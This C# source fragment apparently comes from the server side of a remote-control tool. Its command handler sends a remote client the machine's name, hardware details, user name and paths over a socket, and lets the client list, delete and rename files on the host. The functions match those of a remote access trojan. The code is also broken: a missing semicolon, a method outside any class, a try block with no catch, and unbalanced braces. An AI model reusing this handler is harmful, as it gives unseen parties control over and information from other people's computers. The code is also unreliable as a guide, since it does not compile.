using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System.Collections;
using System.ServiceProcess;
using System.Management

private void DoCommand(ref string command, ref string parameter)
        {
            if (command == "Connected")
            {
                //WriteToClient(ref socket, "true");
            }
            else if (command == "PcInfo")
            {
                SystemInfo systemInfo = new SystemInfo();
                WriteToClient(ref socket, systemInfo.GetMyComputerName() + "\n" + systemInfo.GetMyScreens() + "\n" + systemInfo.GetMyCpuInfo() + "\n" + systemInfo.GetMyMemoryInfo() + "\n" + systemInfo.GetMyDriveInfo() + "\n" + systemInfo.GetMyOSName() + "\n" + systemInfo.GetMyUserName() + "\n" + systemInfo.GetMyPaths());
            }
            //***************************************************************************************
            //文件管理
            else if (command == "Filelist")//文件列表
            {
                try
                {
                    string dir = "";
                    DirectoryInfo curDir = new DirectoryInfo(parameter);
                    if (!curDir.Exists)
                    {
                        dir = "";
                        WriteToClient(ref socket, "<OK>Dir Send\r\n" + dir);
                        return;
                    }
                    DirectoryInfo[] dirdir = curDir.GetDirectories();
                    FileInfo[] dirFiles = curDir.GetFiles();
                    foreach (FileInfo f in dirFiles)
                    {
                        dir = dir + "F:" + f.Name + "\t" + f.Length + "\t" + f.CreationTime.ToString() + "\t" + f.LastWriteTime.ToString() +"\r\n";
                    }
                    foreach (DirectoryInfo d in dirdir)
                    {
                        dir = dir + "D:" + d.Name + "\r\n";
                    }
                    WriteToClient(ref socket, "<OK>Dir Send\r\n" + dir);
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Driverlist")//磁盘列表
            {
                string[] drives = Environment.GetLogicalDrives();
                string str = "<OK>Dir Send\r\n";
                foreach (string s in drives)
                    str += s + "\r\n";
                WriteToClient(ref socket, str);
            }
            else if (command == "DeleteFile")//删除文件
            {
                try
                {
                    File.Delete(parameter);
                }
                catch { }
                string str = "<OK>File Deleted\r\n";
                WriteToClient(ref socket, str);
            }
             else if (command == "Rename")//重命名文件
            {
                try
                {
                    char[] a = new char[] { '\r' };
                    string[] spl = parameter.Split(a);
                    string para1 = spl[0];
                    string para2 = spl[1];
                    File.Copy(para1, para2, true);
                    File.Delete(para1);
                    WriteToClient(ref socket, "<OK>File Renamed!\r\n");
                }
}